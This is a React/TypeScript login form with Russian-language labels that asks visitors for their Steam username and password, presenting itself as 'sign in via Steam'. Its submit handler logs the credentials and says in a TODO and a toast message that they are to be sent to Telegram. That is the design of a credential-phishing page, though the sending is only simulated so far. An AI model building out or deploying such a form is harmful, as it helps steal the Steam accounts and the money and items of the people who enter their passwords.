import { useState } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import * as z from "zod";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Link } from "react-router-dom";
import Icon from "@/components/ui/icon";
import { toast } from "sonner";

const loginSchema = z.object({
  steamUsername: z
    .string()
    .min(3, "Имя пользователя должно содержать минимум 3 символа"),
  steamPassword: z.string().min(1, "Введите пароль"),
});

type LoginFormData = z.infer<typeof loginSchema>;

const LoginForm = () => {
  const [isLoading, setIsLoading] = useState(false);

  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm<LoginFormData>({
    resolver: zodResolver(loginSchema),
  });

  const onSubmit = async (data: LoginFormData) => {
    setIsLoading(true);

    try {
      // TODO: Здесь будет интеграция с Telegram API
      console.log("Steam данные для отправки:", data);

      // Симуляция отправки данных
      setTimeout(() => {
        setIsLoading(false);
        toast.success(
          "Данные Steam получены! (В разработке: отправка в Telegram)",
        );
        window.location.href = "/dashboard";
      }, 2000);
    } catch (error) {
      setIsLoading(false);
      toast.error("Ошибка при обработке данных Steam");
    }
  };

  return (
    <form onSubmit={handleSubmit(onSubmit)} className="space-y-6">
      <div className="space-y-2">
        <Label htmlFor="steamUsername" className="text-slate-200">
          Имя пользователя Steam
        </Label>
        <Input
          id="steamUsername"
          type="text"
          placeholder="Введите имя пользователя Steam"
          {...register("steamUsername")}
          className="h-12 bg-slate-700 border-slate-600 text-white placeholder:text-slate-400"
        />
        {errors.steamUsername && (
          <p className="text-red-400 text-sm">{errors.steamUsername.message}</p>
        )}
      </div>

      <div className="space-y-2">
        <Label htmlFor="steamPassword" className="text-slate-200">
          Пароль Steam
        </Label>
        <Input
          id="steamPassword"
          type="password"
          placeholder="Введите пароль Steam"
          {...register("steamPassword")}
          className="h-12 bg-slate-700 border-slate-600 text-white placeholder:text-slate-400"
        />
        {errors.steamPassword && (
          <p className="text-red-400 text-sm">{errors.steamPassword.message}</p>
        )}
      </div>

      <Button
        type="submit"
        className="w-full h-12 text-lg font-semibold bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 text-white"
        disabled={isLoading}
      >
        {isLoading ? (
          <Icon name="Loader2" className="animate-spin mr-2" />
        ) : (
          <Icon name="LogIn" className="mr-2" />
        )}
        {isLoading ? "Подключение к Steam..." : "Войти через Steam"}
      </Button>

      <div className="text-center space-y-2">
        <p className="text-slate-300 text-sm">
          Нет аккаунта Steam?{" "}
          <Link
            to="/register"
            className="text-blue-400 hover:text-blue-300 font-semibold"
          >
            Создать аккаунт
          </Link>
        </p>
      </div>
    </form>
  );
};

export default LoginForm;
